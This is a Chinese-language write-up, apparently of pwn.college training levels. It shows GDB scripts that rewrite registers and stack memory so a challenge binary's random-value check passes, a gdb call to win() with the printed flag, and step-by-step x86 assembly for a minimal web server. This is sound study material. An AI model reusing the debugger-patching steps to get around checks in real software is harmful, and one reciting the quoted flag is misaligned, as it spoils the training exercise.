<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell">run<br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">572</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_buf</span> = <span class="hljs-variable">$rsi</span><br>    printf <span class="hljs-string">&quot;buf_addr value: %llx\n&quot;</span>, <span class="hljs-variable">$rsi_buf</span><br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">606</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$local_variable</span> = *(uint64_t*)(<span class="hljs-variable">$rsi_buf</span>)<br>    printf <span class="hljs-string">&quot;Random value: %llx\n&quot;</span>, <span class="hljs-variable">$local_variable</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rbp</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rip</span>=<span class="hljs-variable">$rip</span> + <span class="hljs-number">0</span>x18<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">637</span><br>commands<br>    ptype <span class="hljs-variable">$rsi</span><br>    ptype <span class="hljs-variable">$local_variable</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi</span>=<span class="hljs-variable">$local_variable</span><br>    info registers<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241030201710671.png" srcset="/img/loading.gif" lazyload class="" title="image-20241030201710671">

<p>我仅仅修改了printf的内存，导致它输出的内容是一致的，但是后续的cmp指令所比较的，还是取的<code>rbp-0x18</code>地址的内容，这个内容我并没有修改，所以认定为不匹配。我直接修改<code>rbp-0x18</code>地址的内容为这个随机值即可。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">run<br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">572</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rsi_buf</span> = <span class="hljs-variable">$rsi</span><br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">606</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$local_variable</span> = *(uint64_t*)(<span class="hljs-variable">$rsi_buf</span>)<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rbp</span><br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$rip</span>=<span class="hljs-variable">$rip</span> + <span class="hljs-number">0</span>x18<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">break</span> *main+<span class="hljs-number">630</span><br>commands<br>    silent<br>    <span class="hljs-built_in">set</span> *(uint64_t*)(<span class="hljs-variable">$rbp</span><span class="hljs-literal">-0x10</span>) = <span class="hljs-variable">$local_variable</span><br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>OK，自动化成功！</p>
<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">(gdb) call (void)<span class="hljs-built_in">win</span>()<br>You win! Here is your flag:<br>pwn.college&#123;kS6uX4HwFALgoHPYfILQokDmQwX<span class="hljs-selector-class">.0FM1IDLxYTN1YzW</span>&#125;<br></code></pre></td></tr></table></figure>

<p>gdb直接可以调用函数，其实在前面的关卡，我看到有个win函数，就修改过rip寄存器跳到win函数，直接能够获取flag。不过还是一步步做收获大些。毕竟这flag啥也不是</p>
<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><p>因为程序是被损坏了，但是我认为<code>open</code>,<code>read</code>等系统调用应该都挺重要的，所以直接jump过去执行，单步执行来到<code>write</code>后就拿到flag了。</p>
<p>入口是从<code>win+47</code>位置开始的。</p>
<h3 id="Building-a-Web-Server"><a href="#Building-a-Web-Server" class="headerlink" title="Building a Web Server"></a>Building a Web Server</h3><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>正常的exit汇编</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br></code></pre></td></tr></table></figure>



<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>要实现socket，其系统调用为41。原型<code>int socket(int domain, int type, int protocol);</code></p>
<p><code>socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</code></p>
<p>也就是说，domain为<code>AF_INET</code>，type为<code>SOCK_STREAM</code>，protocol为<code>IPPROTO_IP</code></p>
<p>其中，关于第一个参数说明如下：</p>
<ul>
<li><strong><code>AF_INET</code> (2):</strong> IPv4 地址族。</li>
<li><strong><code>AF_INET6</code> (10):</strong> IPv6 地址族。</li>
<li><strong><code>AF_UNIX</code> (1):</strong> Unix 套接字。 这些套接字用于进程间通信，通常在本地主机上使用。 它们不是基于网络的。</li>
<li><strong><code>AF_BLUETOOTH</code> (12):</strong> 用于蓝牙通信的套接字类型。</li>
<li><strong><code>AF_PACKET</code> (17):</strong> 允许应用程序访问底层网络帧。</li>
<li><strong><code>AF_NETLINK</code> (16):</strong> 用于内核模块和用户空间进程之间的消息传递。</li>
<li><strong><code>AF_AX25</code> (11):</strong> 用于 AX.25 协议的套接字类型。</li>
<li><strong><code>AF_X25</code> (15):</strong> 用于 X.25 协议的套接字类型。</li>
<li><strong><code>AF_ATMPVC</code> (21):</strong> 用于 ATM (Asynchronous Transfer Mode) 协议的虚拟通道 (PVC)。</li>
<li><strong><code>AF_APPLETALK</code> (23):</strong> 用于 AppleTalk 协议的套接字类型。</li>
<li><strong><code>AF_NETBIOS</code> (24):</strong> 用于 NetBIOS 协议的套接字类型。</li>
</ul>
<p>关于第二个参数说明如下：</p>
<ul>
<li><strong><code>SOCK_STREAM</code> (1):</strong> 面向连接的流式套接字。数据被可靠地传输，以字节流的形式发送，顺序保证。 这类似于 TCP。</li>
<li><strong><code>SOCK_DGRAM</code> (2):</strong> 无连接的数据报套接字。数据包可能会丢失或顺序颠倒。 这类似于 UDP。 数据被发送成独立的数据报，没有可靠性保证。</li>
<li><strong><code>SOCK_SEQPACKET</code> (3):</strong> 面向连接的序列包套接字。它试图提供 TCP 的可靠性但不需要三次握手，在某些情况下性能更好。 这种类型比较少见。</li>
<li><strong><code>SOCK_RAW</code> (3):</strong> 原始套接字。允许应用程序访问底层网络协议。程序员可以访问网络协议的详细信息，控制传输的整个过程。这需要对网络协议有深入的了解，使用风险比较高。</li>
</ul>
<p>关于第三个参数说明如下：</p>
<ul>
<li><strong><code>IPPROTO_IP</code> (0):</strong> IP 协议。 这个值通常在使用 TCP 或 UDP 时使用，因为它在底层协议栈中就已经存在了。 它不是一个独立的协议，而是 IP 协议栈的一部分。</li>
<li><strong><code>IPPROTO_TCP</code> (6):</strong> 传输控制协议 (TCP)。 这指定了使用 TCP 协议。</li>
<li><strong><code>IPPROTO_UDP</code> (17):</strong> 用户数据报协议 (UDP)。 这指定了使用 UDP 协议。</li>
<li><strong><code>IPPROTO_ICMP</code> (1):</strong> 因特网控制消息协议 (ICMP)。 ICMP 用于错误报告和查询。</li>
<li><strong><code>IPPROTO_IGMP</code> (2):</strong> 因特网组管理协议 (IGMP)。 IGMP 用于多播。</li>
<li><strong><code>IPPROTO_IPIP</code> (4):</strong> IP over IP。 这允许一个 IP 数据报封装在另一个 IP 数据报中。</li>
<li><strong><code>IPPROTO_RSVP</code> (46):</strong> 资源预留协议 (RSVP)。 用于保证多媒体应用程序的带宽。</li>
<li><strong><code>IPPROTO_GRE</code> (47):</strong> 通用路由封装 (GRE)。 允许将不同协议的数据包封装在 IP 数据报中。</li>
<li><strong><code>IPPROTO_AH</code> (51):</strong> 认证头 (AH)。 用于安全通信。</li>
</ul>
<p>那么最终的exp为：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>		# AF_INET(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span>		# SOCK_STREAM(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>		# IPPROTO_IP(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><br></code></pre></td></tr></table></figure>



<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><p>实现bind，<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</code></p>
<p>bind原型：<code>int bind(int sockfd, const struct sockaddr addr, socklen_t addrlen)</code></p>
<p>好吧，我想不出来。看别人的wp，很好，用到了.data段定义这个结构体。然后端口是0x5000，是80的小端序</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>绑定的地址为0.0.0.0即<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</code></p>
<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h4><p>要完成<code>listen(3, 0) = 0</code>，这个简单啊，listen系统调用号为50</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h4><p>要完成<code>accept(3, NULL, NULL) = 4</code> accept的系统调用号为43</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h4><p>这一关有点东西，要完成三个东西：<code>read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</code>，<code>write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</code>和<code>close(4) = 0</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><br></code></pre></td></tr></table></figure>

<p>这一关的目的是，能够接收客户端发送来的消息，并反馈200状态码。</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>那么这一关，就响应客户端的请求，将它要的文件，发送给它。那么就有个问题了，第一个read会读取客户端发来的请求，然后这个请求很长，该怎么精准拿到这个文件呢？</p>
